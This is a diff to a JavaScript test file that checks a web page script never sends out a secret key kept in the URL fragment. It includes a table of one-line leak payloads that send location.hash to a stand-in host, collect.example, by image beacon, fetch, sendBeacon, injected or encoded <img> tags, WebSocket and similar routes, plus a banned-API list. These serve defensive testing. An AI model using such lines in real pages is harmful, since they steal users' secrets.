@@ -91,24 +91,29 @@ test('a shell with no club id shows no button', () => {
   assert.equal(document.getElementById('open').hasAttribute('hidden'), true);
 });
 
-// The script runs for real, in a page with a recording stub on every way it could send the key out. A text search for
-// banned words passes a one-line `new Image().src = 'https://collect.example/?k=' + location.hash`; this does not
-// (#4317). Dynamic import() has no stub: the page's CSP (default-src 'none', pinned by the Go test
-// TestClubPageKeepsTheSecurityHeadersAndFetchesNothing) is what stops it, and the text search below stays as a backstop.
+// The script runs for real, in a page where every way out records itself: a stub for each network, timer, storage and
+// window API, and an exact expected page, so an element or attribute the script adds shows even when it carries the key
+// in an encoded form. A text search for banned words passes a one-line `new Image().src = '...' + location.hash`; this
+// does not (#4317). Dynamic import() has no stub, so the script may contain no `import` at all (checked below), and the
+// page's CSP (default-src 'none', pinned by the Go test TestClubPageKeepsTheSecurityHeadersAndFetchesNothing) is the
+// second layer for what no stub can see.
 const SCRIPT = new URL('./club-page.mjs', import.meta.url);
-const GLOBALS = ['document', 'location', 'window', 'fetch', 'XMLHttpRequest', 'Image', 'Audio', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker', 'Request', 'open', 'importScripts', 'localStorage', 'sessionStorage', 'indexedDB', 'caches', 'navigator'];
+const FUNCTIONS = ['fetch', 'XMLHttpRequest', 'Image', 'Audio', 'Option', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker', 'Request', 'BroadcastChannel', 'WebTransport', 'RTCPeerConnection', 'Notification', 'open', 'importScripts', 'postMessage', 'setTimeout', 'setInterval', 'setImmediate', 'queueMicrotask', 'requestAnimationFrame', 'requestIdleCallback', 'structuredClone', 'eval', 'Function'];
+const OBJECTS = ['localStorage', 'sessionStorage', 'indexedDB', 'caches', 'history', 'navigator', 'cookieStore', 'serviceWorker', 'performance'];
+const GLOBALS = ['document', 'location', 'window', 'self', 'top', 'parent', ...FUNCTIONS, ...OBJECTS];
 
 async function runScript(source, label) {
   const dir = mkdtempSync(join(tmpdir(), 'club-page-'));
   const file = join(dir, `${label}.mjs`);
   writeFileSync(file, source);
   const calls = [];
-  const rec = (name) => function (...args) { calls.push(`${name}(${args.map(String).join(', ')})`); return anything(name); };
-  // Whatever the script does with the result (chain, construct, call a method) is recorded too.
+  const realTimeout = globalThis.setTimeout;
+  // Whatever the script does with a stub (call it, construct it, read a member, assign one) is recorded.
   const anything = (name) => new Proxy(function () {}, {
-    get: (_, p) => (p === 'then' ? undefined : rec(`${name}.${String(p)}`)),
+    get: (_, p) => (p === 'then' || p === Symbol.toPrimitive ? undefined : anything(`${name}.${String(p)}`)),
     set(_, p, v) { calls.push(`${name}.${String(p)} = ${v}`); return true; },
-    apply() { calls.push(`${name}()`); return anything(name); },
+    apply(_, __, args) { calls.push(`${name}(${args.map(String).join(', ')})`); return anything(name); },
+    construct(_, args) { calls.push(`new ${name}(${args.map(String).join(', ')})`); return anything(name); },
   });
   const saved = Object.fromEntries(GLOBALS.map((g) => [g, Object.getOwnPropertyDescriptor(globalThis, g)]));
   const { document } = parseHTML(SHELL);
@@ -116,26 +121,22 @@ async function runScript(source, label) {
     const real = document[m]?.bind(document);
     document[m] = (...args) => { calls.push(`document.${m}(${args.map(String).join(', ')})`); return real?.(...args); };
   }
-  for (const k of ['cookie']) Object.defineProperty(document, k, { get() { calls.push(`document.${k} read`); return ''; }, set(v) { calls.push(`document.${k} = ${v}`); }, configurable: true });
+  Object.defineProperty(document, 'cookie', { get() { calls.push('document.cookie read'); return ''; }, set(v) { calls.push(`document.cookie = ${v}`); }, configurable: true });
   const location = new Proxy({ host: HOST, hash: `#${KEY}`, search: '', pathname: `/c/${ID}` }, {
     set(_, prop, value) { calls.push(`location.${String(prop)} = ${value}`); return true; },
-    get(target, prop) { return prop in target ? target[prop] : rec(`location.${String(prop)}`); },
+    get(target, prop) { return prop in target ? target[prop] : anything(`location.${String(prop)}`); },
   });
-  const windowStub = { open: rec('window.open'), fetch: rec('window.fetch'), navigator: { sendBeacon: rec('navigator.sendBeacon') } };
-  Object.defineProperty(windowStub, 'location', { get: () => location, set(v) { calls.push(`window.location = ${v}`); } });
-  const stubs = {
-    document, location, window: windowStub, fetch: rec('fetch'), XMLHttpRequest: rec('new XMLHttpRequest'), Image: rec('new Image'), Audio: rec('new Audio'),
-    WebSocket: rec('new WebSocket'), EventSource: rec('new EventSource'), Worker: rec('new Worker'), SharedWorker: rec('new SharedWorker'), Request: rec('new Request'),
-    open: rec('open'), importScripts: rec('importScripts'), navigator: windowStub.navigator,
-    localStorage: new Proxy({}, { get: (_, p) => { calls.push(`localStorage.${String(p)}`); return rec(`localStorage.${String(p)}`); } }),
-    sessionStorage: new Proxy({}, { get: (_, p) => { calls.push(`sessionStorage.${String(p)}`); return rec(`sessionStorage.${String(p)}`); } }),
-    indexedDB: new Proxy({}, { get: (_, p) => { calls.push(`indexedDB.${String(p)}`); return rec(`indexedDB.${String(p)}`); } }),
-    caches: new Proxy({}, { get: (_, p) => { calls.push(`caches.${String(p)}`); return rec(`caches.${String(p)}`); } }),
-  };
+  Object.defineProperty(document, 'location', { get: () => location, set(v) { calls.push(`document.location = ${v}`); }, configurable: true });
+  const windowStub = new Proxy({}, {
+    get(_, p) { return p === 'location' ? location : p === 'document' ? document : anything(`window.${String(p)}`); },
+    set(_, p, v) { calls.push(p === 'location' ? `window.location = ${v}` : `window.${String(p)} = ${v}`); return true; },
+  });
+  const stubs = { document, location, window: windowStub, self: windowStub, top: windowStub, parent: windowStub };
+  for (const name of [...FUNCTIONS, ...OBJECTS]) stubs[name] = anything(name);
   try {
     for (const [name, value] of Object.entries(stubs)) Object.defineProperty(globalThis, name, { value, configurable: true, writable: true });
     await import(pathToFileURL(file).href);
-    await new Promise((resolve) => setTimeout(resolve, 20)); // a timer the script set would run now
+    await new Promise((resolve) => realTimeout(resolve, 20));
   } finally {
     for (const g of GLOBALS) {
       if (saved[g]) Object.defineProperty(globalThis, g, saved[g]); else delete globalThis[g];
@@ -145,47 +146,67 @@ async function runScript(source, label) {
   return { calls, html: document.documentElement.outerHTML };
 }
 
+/** The page after the script has done its one job: the open button shown with the app address, the fallback words gone. */
+function expectedPage() {
+  const { document } = parseHTML(SHELL);
+  const open = document.getElementById('open');
+  open.setAttribute('href', openInAppAddress(ID, HOST, `#${KEY}`));
+  open.removeAttribute('hidden');
+  document.getElementById('status').textContent = '';
+  return document.documentElement.outerHTML;
+}
+
 const PRISTINE = readFileSync(SCRIPT, 'utf8');
+// No comments, so a banned word in prose does not trip the search and a comment cannot hide one from it.
+const CODE = PRISTINE.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/^\s*\/\/.*$/gm, '');
 
 test('the script makes no request and keeps nothing, run for real', async () => {
   const { calls, html } = await runScript(PRISTINE, 'pristine');
   assert.deepEqual(calls, []);
-  assert.ok(html.includes(`href="${openInAppAddress(ID, HOST, `#${KEY}`)}"`), 'the script ran and wrote the open address');
-  // The key is in the one href and nowhere else in the page.
-  assert.equal(html.split(KEY).length - 1, 1, 'the key appears once, inside the open address');
+  assert.equal(html, expectedPage(), 'the page is the shell plus the open address and nothing else');
 });
 
 // A guard that cannot fail is the finding in #4317, so the harness is shown a script that leaks the key by each route.
 const LEAKS = {
-  'image beacon': "new Image().src = 'https://collect.example/?k=' + location.hash;",
+  'an image beacon': "new Image().src = 'https://collect.example/?k=' + location.hash;",
   fetch: "fetch('https://collect.example/?k=' + location.hash);",
-  'XMLHttpRequest': "new XMLHttpRequest().open('GET', 'https://collect.example/?k=' + location.hash);",
+  XMLHttpRequest: "new XMLHttpRequest().open('GET', 'https://collect.example/?k=' + location.hash);",
   sendBeacon: "navigator.sendBeacon('https://collect.example/', location.hash);",
   'window.open': "window.open('https://collect.example/?k=' + location.hash);",
-  'location assignment': "location.href = 'https://collect.example/?k=' + location.hash;",
+  'a location assignment': "location.href = 'https://collect.example/?k=' + location.hash;",
   'location.assign': "location.assign('https://collect.example/?k=' + location.hash);",
   'window.location': "window.location = 'https://collect.example/?k=' + location.hash;",
+  'document.location': "document.location = 'https://collect.example/?k=' + location.hash;",
+  'window.name': "window.name = location.hash;",
   'a <link> element': "document.head?.appendChild(document.createElement('link'));",
   'an <img> through innerHTML': "document.getElementById('status').innerHTML += '<img src=\"https://collect.example/?k=' + location.hash + '\">';",
+  'an <img> with the key encoded': "document.getElementById('status').innerHTML += '<img src=\"https://collect.example/?k=' + btoa(location.hash) + '\">';",
   'an <img> inserted next to the button': "document.getElementById('open').insertAdjacentHTML('afterend', '<img src=\"https://collect.example/?k=' + location.hash + '\">');",
+  'a ping attribute': "document.getElementById('open').setAttribute('ping', 'https://collect.example/?k=' + location.hash);",
   WebSocket: "new WebSocket('wss://collect.example/' + location.hash.slice(1));",
-  'a later timer': "setTimeout(() => fetch('https://collect.example/?k=' + location.hash), 1);",
-  'storage write': "localStorage.setItem('k', location.hash);",
+  BroadcastChannel: "new BroadcastChannel('k').postMessage(location.hash);",
+  'a later timer': "setTimeout(() => fetch('https://collect.example/?k=' + location.hash), 100);",
+  'a storage write': "localStorage.setItem('k', location.hash);",
   cookie: "document.cookie = 'k=' + location.hash;",
 };
 
 for (const [name, leak] of Object.entries(LEAKS)) {
   test(`the run-for-real check catches a script that leaks the key by ${name}`, async () => {
     const label = name.replace(/\W+/g, '-');
-    const pristine = await runScript(PRISTINE, `${label}-pristine`);
     const { calls, html } = await runScript(`${PRISTINE}\n${leak}\n`, label);
-    assert.ok(calls.length > 0 || html !== pristine.html, `nothing noticed: ${leak}`);
+    assert.ok(calls.length > 0 || html !== expectedPage(), `nothing noticed: ${leak}`);
   });
 }
 
-test('the text search stays as a backstop for what the run cannot stub', () => {
-  const source = PRISTINE.replace(/^\s*\/\/.*$/gm, '');
-  for (const banned of ['fetch(', 'XMLHttpRequest', 'sendBeacon', 'WebSocket', 'localStorage', 'sessionStorage', 'document.cookie', 'location.replace', 'location.assign', 'innerHTML', 'import(', 'new Image', 'window.open']) {
-    assert.ok(!source.includes(banned), banned);
+test('a timer a leaking script set does not fire after its run and spoil a later test', async () => {
+  const before = (await runScript(`${PRISTINE}\n${LEAKS['a later timer']}\n`, 'timer')).calls;
+  assert.ok(before.some((c) => c.startsWith('setTimeout(')));
+  assert.deepEqual((await runScript(PRISTINE, 'after-timer')).calls, []);
+});
+
+test('the script has no import, dynamic or otherwise, and no word the run cannot stub', () => {
+  assert.doesNotMatch(CODE, /\bimport\b/, 'import() reaches the server with the key in its address and has no stub');
+  for (const banned of ['fetch', 'XMLHttpRequest', 'sendBeacon', 'WebSocket', 'localStorage', 'sessionStorage', 'cookie', 'location.replace', 'location.assign', 'innerHTML', 'insertAdjacentHTML', 'Image', 'window.', 'navigator', 'createElement', 'setTimeout', 'eval']) {
+    assert.ok(!CODE.includes(banned), banned);
   }
 });
